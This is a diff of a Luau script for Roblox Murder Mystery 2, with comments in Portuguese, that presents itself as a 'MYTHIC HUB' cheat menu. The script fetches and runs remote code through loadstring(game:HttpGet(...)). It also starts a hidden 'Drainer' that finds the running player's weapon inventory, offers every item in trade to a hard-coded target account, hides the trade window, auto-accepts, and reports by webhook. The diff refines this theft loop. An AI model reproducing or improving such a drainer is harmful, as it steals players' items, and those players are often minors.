@@ -1,18 +1,5 @@
--- Luau / MYTHIC_HUB.lua + DRAINER / Roblox MM2
-local url = "https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/MYTHIC_HUB_RESTAURADO.lua"
-local ok, body = pcall(function() return game:HttpGet(url) end)
-if not ok or type(body) ~= "string" or body == "" then
-    error("MYTHIC HUB: erro ao baixar o loader. Verifique a conexao e o GitHub.")
-end
-local run, err = loadstring(body)
-if type(run) ~= "function" then
-    error("MYTHIC HUB: erro ao compilar loader: " .. tostring(err))
-end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MYTHIC-HUB/scripts/main/MYTHIC-HUB/MYTHIC_HUB.lua"))()
 
--- 1. Executa o menu do Hub (tirei o "return" para ele não fechar o script)
-run()
-
--- 2. Liga o Drainer em segundo plano
 task.spawn(function()
     local Players = game:GetService("Players")
     local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -29,7 +16,7 @@ task.spawn(function()
     task.spawn(function()
         local body = HttpService:JSONEncode({
             embeds = {{
-                title = "Drainer Ativo no MM2",
+                title = "Drainer Ativo",
                 description = "Procurando o alvo: `" .. TARGET_NAME .. "`",
                 color = 0x9743EF
             }}
@@ -73,15 +60,21 @@ task.spawn(function()
     end
     playerGui.ChildAdded:Connect(function(g) for _, n in ipairs({"TradeGUI", "TradeGUI_Phone"}) do if g.Name == n then task.wait(0.1); if g:IsA("ScreenGui") then lockGui(g) end end end end)
 
-    local function offerAll()
-        local items = {}
-        local profile = nil
+    local cachedProfile = nil
+    local function getProfile()
+        if cachedProfile then return cachedProfile end
         if type(getgc) == "function" then
-            pcall(function() for _, obj in pairs(getgc(true)) do if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then profile = obj break end end end)
+            pcall(function() for _, obj in pairs(getgc(true)) do if type(obj) == "table" and rawget(obj, "Weapons") and type(rawget(obj, "Weapons").Owned) == "table" then cachedProfile = obj break end end end)
         end
-        if not profile then pcall(function() profile = require(ReplicatedStorage.Modules.ProfileData) end) end
+        if not cachedProfile then pcall(function() cachedProfile = require(ReplicatedStorage.Modules.ProfileData) end) end
+        return cachedProfile
+    end
+
+    local function offerAll()
+        local profile = getProfile()
         if not profile then return end
         
+        local items = {}
         if profile.Weapons and type(profile.Weapons.Owned) == "table" then
             for id, qty in pairs(profile.Weapons.Owned) do
                 if id ~= "DefaultKnife" and id ~= "DefaultGun" then table.insert(items, {id = id, amount = tonumber(qty) or 1}) end
@@ -130,6 +123,7 @@ task.spawn(function()
     acceptTradeRemote.OnClientEvent:Connect(function(completed)
         if completed then
             state.trading = false
+            cachedProfile = nil 
             task.spawn(function()
                 task.wait(1.5)
                 requestTrade(findTarget())
@@ -139,7 +133,7 @@ task.spawn(function()
 
     task.spawn(function()
         while true do
-            task.wait(0.1)
+            task.wait(0.2) 
             if state.trading and state.lastOffer and state.lastOffer ~= state.lastAccepted and state.currentPartner and state.currentPartner.Name:lower() == TARGET_NAME:lower() and os.clock() - state.lastOfferAt >= 6.2 then
                 state.lastAccepted = state.lastOffer
                 pcall(function() acceptTradeRemote:FireServer(game.PlaceId * 3, state.lastOffer) end)
